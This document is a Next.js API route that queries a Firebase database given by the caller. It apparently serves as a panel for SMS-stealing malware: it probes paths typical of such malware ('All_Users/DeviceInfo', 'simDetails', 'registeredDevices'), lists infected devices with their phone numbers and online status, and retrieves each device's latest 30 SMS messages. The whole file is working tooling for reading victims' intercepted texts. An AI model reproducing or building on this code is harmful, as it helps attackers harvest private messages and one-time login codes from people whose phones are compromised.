import { NextResponse } from "next/server";
import { fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths, extractPhone } from "@/lib/firebase";

export const dynamic = "force-dynamic";

export async function POST(req) {
  try {
    const body = await req.json();
    const action = body.action || "devices";
    const base = cleanBase(body.url || "");
    const auth = body.auth || "";
    if (!base.includes("firebaseio.com") && !base.includes("firebasedatabase.app")) {
      return NextResponse.json({ ok: false, error: "Invalid Firebase URL" }, { status: 400 });
    }

    if (action === "ping") {
      const r = await fbGet(base, ".json?shallow=true", auth);
      return NextResponse.json({ ok: r.ok, status: r.status, error: r.error || null });
    }

    if (action === "devices") {
      const roots = [
        "clients",
        "user_data",
        "All_Users/DeviceInfo",
        "All_Users/simDetails",
        "registeredDevices",
        "devices",
        "user_list",
      ];
      let devices = [];
      let used = null;

      for (const root of roots) {
        const r = await fbGet(base, root, auth);
        if (r.ok && r.data && typeof r.data === "object") {
          const list = normalizeDevices(r.data);
          if (list.length > devices.length) {
            devices = list;
            used = root;
          }
          if (list.some((d) => d.phone)) {
            devices = list;
            used = root;
            break;
          }
        }
      }

      // merge phones from simDetails if present
      const sim = await fbGet(base, "All_Users/simDetails", auth);
      if (sim.ok && sim.data && typeof sim.data === "object") {
        const map = {};
        for (const [id, val] of Object.entries(sim.data)) {
          const p = extractPhone(val);
          if (p) map[id] = p;
        }
        if (Object.keys(map).length) {
          devices = devices.map((d) => ({ ...d, phone: d.phone || map[d.id] || "" }));
        }
      }

      const online = devices.filter((d) => d.online).length;
      return NextResponse.json({
        ok: true,
        root: used,
        total: devices.length,
        online,
        offline: devices.length - online,
        withPhone: devices.filter((d) => d.phone).length,
        devices,
      });
    }

    if (action === "sms") {
      const deviceId = body.deviceId;
      if (!deviceId) return NextResponse.json({ ok: false, error: "deviceId required" }, { status: 400 });
      let messages = [];
      let used = null;
      for (const p of smsPaths(deviceId)) {
        const r = await fbGet(base, `${p}?orderBy="$key"&limitToLast=30`, auth);
        if (r.ok && r.data && typeof r.data === "object") {
          messages = normalizeSms(r.data);
          used = p;
          if (messages.length) break;
        }
      }
      return NextResponse.json({ ok: true, path: used, messages });
    }

    return NextResponse.json({ ok: false, error: "unknown action" }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ ok: false, error: String(e.message || e) }, { status: 500 });
  }
}
